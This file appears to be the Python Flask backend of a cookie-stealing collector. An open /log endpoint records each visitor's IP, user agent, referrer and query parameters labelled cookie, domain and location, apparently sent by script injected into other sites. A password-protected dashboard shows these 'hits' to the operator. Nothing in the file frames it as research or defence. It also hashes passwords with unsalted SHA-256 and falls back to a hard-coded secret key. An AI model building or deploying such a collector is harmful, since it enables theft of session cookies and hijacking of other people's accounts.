from flask import Flask, request, render_template, redirect, url_for, session, flash
import datetime, json, hashlib, os
from functools import wraps

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "replace-this-with-env-var")

# File paths
CREDS_FILE = "credentials.json"
LOG_FILE   = "logs/hits.log"

# --- Helper Functions ---

def load_credentials():
    with open(CREDS_FILE) as f:
        return json.load(f)

def save_credentials(creds):
    with open(CREDS_FILE, "w") as f:
        json.dump(creds, f, indent=2)

def hash_password(pwd):
    return hashlib.sha256(pwd.encode()).hexdigest()

def valid_login(username, password):
    creds = load_credentials()
    return username == creds["username"] and hash_password(password) == creds["password_hash"]

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("user"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

# --- Routes ---

@app.route("/")
def index():
    if session.get("user"):
        return redirect(url_for("dashboard"))
    return redirect(url_for("login"))

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if valid_login(username, password):
            session["user"] = username
            return redirect(url_for("dashboard"))
        flash("Invalid credentials", "danger")
    return render_template("login.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

@app.route("/dashboard")
@login_required
def dashboard():
    hits = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            hits = [json.loads(line) for line in f]
    hits.reverse()  # Newest first
    return render_template("dashboard.html", hits=hits)

@app.route("/change_password", methods=["GET", "POST"])
@login_required
def change_password():
    if request.method == "POST":
        old = request.form["old"]
        new = request.form["new"]
        creds = load_credentials()
        if hash_password(old) == creds["password_hash"]:
            creds["password_hash"] = hash_password(new)
            save_credentials(creds)
            flash("Password changed successfully", "success")
            return redirect(url_for("dashboard"))
        else:
            flash("Old password incorrect", "danger")
    return render_template("change_password.html")

@app.route("/log")
def log():
    os.makedirs("logs", exist_ok=True)

    data = {
        "time": datetime.datetime.utcnow().isoformat(),
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
        "referrer": request.headers.get("Referer"),
        "cookie": request.args.get("c", ""),
        "domain": request.args.get("d", ""),
        "location": request.args.get("l", "")
    }

    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(data) + "\n")

    return "OK"
